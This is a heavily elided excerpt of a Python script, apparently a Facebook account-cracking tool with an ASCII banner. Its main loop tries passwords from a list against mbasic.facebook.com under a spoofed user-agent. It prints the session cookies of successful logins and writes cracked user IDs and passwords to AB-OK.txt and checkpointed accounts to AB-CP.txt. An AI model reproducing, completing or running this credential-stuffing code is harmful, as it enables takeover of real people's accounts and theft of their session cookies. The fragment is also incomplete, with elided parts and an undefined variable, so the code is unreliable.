...
logo = """
      ...
      _______  _     _  _______  _______  ___  
     |       || | _ | ||   _   ||       ||   | 
     |  _____|| || || ||  |_|  ||_     _||   | 
     | |_____ |       ||       |  |   |  |   | 
     |_____  ||       ||       |  |   |  |   | 
...
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 2.3 \033[1;37m"WAIT AND WATCH!"\033[1;37m
--------------------------------------------------"""
    ...
    try:
        for ps in pwx:
            ...
            headers = {'authority': 'mbasic.facebook.com',
              ...
              'user-agent': 'Opera/9.30 (Nintendo Wii; U; ; 2071; Wii Shop Channel/1.0; en)',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[AB-OK'+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('AB-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[AB-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('AB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mAB\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
